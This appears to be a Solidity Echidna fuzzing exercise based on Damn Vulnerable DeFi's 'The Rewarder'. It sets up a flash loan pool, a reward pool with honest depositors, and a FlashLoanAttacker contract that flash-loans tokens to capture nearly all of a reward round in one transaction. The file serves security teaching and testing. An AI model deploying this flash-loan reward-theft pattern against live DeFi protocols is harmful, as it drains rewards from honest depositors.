// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

/// @title DamnValuableToken (local for exercise 8)
/// @notice Simple ERC20 token with max supply minted to deployer
contract DamnValuableToken is ERC20 {
    /// @notice Deploys token and mints max supply to deployer
    constructor() ERC20("DamnValuableToken", "DVT") {
        _mint(msg.sender, type(uint256).max);
    }
}

/// @title FlashLoanAttacker - Helper contract to execute the flash loan attack
/// @notice Performs the flash loan + deposit + withdraw attack on TheRewarderPool
/// @dev EX8-03: Separated into its own contract so that receiveFlashLoan callback
///      is reachable (the flash loan pool calls back to msg.sender which must implement it).
contract FlashLoanAttacker is IFlashLoanReceiver {
    /// @notice The liquidity token
    IERC20 public liquidityToken;

    /// @notice The flash loan pool providing capital
    FlashLoanerPool public flashLoanPool;

    /// @notice The reward pool being attacked
    TheRewarderPool public rewarderPool;

    /// @notice The owner who can trigger the attack
    address public owner;

    /// @notice Initializes the attacker with references to all pools
    /// @param _liquidityToken The token used across pools
    /// @param _flashLoanPool The flash loan provider
    /// @param _rewarderPool The target reward pool
    constructor(
        address _liquidityToken,
        address _flashLoanPool,
        address _rewarderPool
    ) {
        liquidityToken = IERC20(_liquidityToken);
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        owner = msg.sender;
    }

    /// @notice Triggers the flash loan attack
    /// @dev EX8-03: Initiates a flash loan; the callback handles the exploit
    /// @param amount The amount to flash loan
    function attack(uint256 amount) external {
        flashLoanPool.flashLoan(amount);
    }

    /// @notice Flash loan callback - executes the reward theft strategy
    /// @dev EX8-03: Deposits flash-loaned tokens into reward pool to claim rewards,
    ///      then immediately withdraws and repays the flash loan.
    ///      This is reachable because FlashLoanerPool calls back to this contract.
    /// @param amount The amount of tokens received from the flash loan
    function receiveFlashLoan(uint256 amount) external override {
        // EX8-03: Deposit into reward pool (triggers distributeRewards)
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);

        // EX8-03: Withdraw from reward pool (we keep the reward tokens)
        rewarderPool.withdraw(amount);

        // EX8-03: Repay flash loan
        liquidityToken.transfer(address(flashLoanPool), amount);
    }
}

/// @title HonestDepositor - Simulates an honest user depositing into the reward pool
/// @notice Deposits tokens into the reward pool to create realistic initial state
/// @dev EX8-03: Seeds the rewarder with honest deposits so rewards can be distributed
contract HonestDepositor {
    /// @notice Deposits tokens into the reward pool on behalf of an honest user
    /// @param token The liquidity token to deposit
    /// @param rewarderPool The reward pool to deposit into
    /// @param amount The amount to deposit
    function deposit(IERC20 token, TheRewarderPool rewarderPool, uint256 amount) external {
        token.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
    }
}

/// @title TheRewarderEchidna - Echidna Exercise 8: The Rewarder
/// @author Trail of Bits / Damn Vulnerable DeFi (Echidna Exercise)
/// @notice Tests that an attacker cannot claim more than 99% of rewards.
/// @dev EX8-03: Setup: Flash loan pool has 1M liquidity tokens, reward pool is seeded
///      with 4 honest depositors each depositing TOKENS_PER_USER (100 ether).
///      The bug: An attacker can flash loan a large amount of tokens, deposit them
///      into the reward pool right when a new reward round starts, claim the
///      proportional reward (nearly 100% due to the large deposit relative to honest deposits),
///      then withdraw and repay the flash loan - all in one transaction.
///      The fix would require time-weighted deposit tracking for reward distribution.
contract TheRewarderEchidna {
    /// @notice The liquidity token used across both pools
    DamnValuableToken public liquidityToken;

    /// @notice The flash loan pool providing the attack capital
    FlashLoanerPool public flashLoanPool;

    /// @notice The reward pool being attacked
    TheRewarderPool public rewarderPool;

    /// @notice The attacker helper contract
    FlashLoanAttacker public attacker;

    /// @notice Amount of tokens in the flash loan pool (1M)
    uint256 constant TOKENS_IN_LENDER_POOL = 1000000 ether;

    /// @notice Tokens per honest user deposit
    uint256 constant TOKENS_PER_USER = 100 ether;

    /// @notice Sets up the complete test environment
    /// @dev EX8-03: Deploys all contracts, seeds rewarder with 4 honest depositors
    ///      (TOKENS_PER_USER * 4), and deploys the flash loan attacker helper.
    constructor() {
        // Deploy liquidity token
        liquidityToken = new DamnValuableToken();

        // Deploy flash loan pool
        flashLoanPool = new FlashLoanerPool(address(liquidityToken));

        // Fund flash loan pool with 1M tokens
        liquidityToken.transfer(address(flashLoanPool), TOKENS_IN_LENDER_POOL);

        // Deploy rewarder pool
        rewarderPool = new TheRewarderPool(address(liquidityToken));

        // EX8-03: Seed the rewarder with TOKENS_PER_USER * 4 of honest deposits
        // This creates a realistic scenario where 4 honest users have deposited
        for (uint256 i = 0; i < 4; i++) {
            HonestDepositor depositor = new HonestDepositor();
            liquidityToken.transfer(address(depositor), TOKENS_PER_USER);
            depositor.deposit(IERC20(address(liquidityToken)), rewarderPool, TOKENS_PER_USER);
        }

        // EX8-03: Deploy the attacker helper contract (has the receiveFlashLoan callback)
        attacker = new FlashLoanAttacker(
            address(liquidityToken),
            address(flashLoanPool),
            address(rewarderPool)
        );
    }

    /// @notice Echidna property: attacker should not get more than 99% of rewards
    /// @dev EX8-03: This will FAIL because the flash loan attack allows claiming
    ///      nearly all rewards in a single transaction when a new round starts.
    /// @return true if attacker has less than 99% of rewards, false if exploited
    function echidna_test_reward_distribution() public view returns (bool) {
        // Check if attacker has received more than 99% of the total rewards
        uint256 attackerRewards = rewarderPool.rewardToken().balanceOf(
            address(attacker)
        );
        // EX8-03: Attacker should NOT have more than 99% of REWARDS_AMOUNT
        return attackerRewards < (99 * rewarderPool.REWARDS_AMOUNT()) / 100;
    }
}
